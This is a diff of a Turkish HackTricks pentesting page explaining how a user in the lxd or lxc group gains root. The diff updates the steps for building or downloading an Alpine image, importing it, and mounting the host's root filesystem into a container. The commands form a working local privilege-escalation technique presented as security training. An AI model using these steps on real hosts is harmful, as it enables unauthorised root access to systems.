@@ -2,24 +2,27 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-_Eğer_ **lxd** _veya_ **lxc** _grubuna ait iseniz, root olabilirsiniz._
+Eğer _**lxd**_ **veya** _**lxc**_ **grubuna** ait iseniz, root olabilirsiniz.
 
 ## İnternetsiz Sömürü
 
 ### Yöntem 1
 
-Makinenize bu dağıtım oluşturucusunu kurabilirsiniz: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github talimatlarını takip edin):
+Güvenilir bir depodan lxd ile kullanmak için bir alpine imajı indirebilirsiniz. Canonical, sitesinde günlük derlemeler yayınlamaktadır: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) En yeni derlemeden hem **lxd.tar.xz** hem de **rootfs.squashfs** dosyalarını alın. (Dizin adı tarihtir).
+
+Alternatif olarak, bu dağıtım oluşturucusunu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github talimatlarını takip edin):
 ```bash
-sudo su
 # Install requirements
 sudo apt update
-sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
 
 # Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
 git clone https://github.com/lxc/distrobuilder
 
 # Make distrobuilder
-cd distrobuilder
+cd ./distrobuilder
 make
 
 # Prepare the creation of alpine
@@ -27,13 +30,10 @@ mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 
-# Create the container
-## Using build-lxd
-sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
-## Using build-lxc
-sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
+**incus.tar.xz** dosyasını (**Canonical deposundan indirdiyseniz **lxd.tar.xz**) ve **rootfs.squashfs** dosyasını yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,8 +49,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Eğer bu hatayı _**Hata: Depolama havuzu bulunamadı. Lütfen yeni bir depolama havuzu oluşturun**_\
-> **`lxd init`** komutunu çalıştırın ve önceki komut grubunu **tekrar** edin
+> Eğer bu hatayı _**Hata: Depo havuzu bulunamadı. Lütfen yeni bir depo havuzu oluşturun**_\
+> bulursanız, **`lxd init`** komutunu çalıştırın ve tüm seçenekleri varsayılan olarak ayarlayın. Ardından **önceki** komutlar grubunu **tekrar** edin
 
 Sonunda konteyneri çalıştırabilir ve root alabilirsiniz:
 ```bash
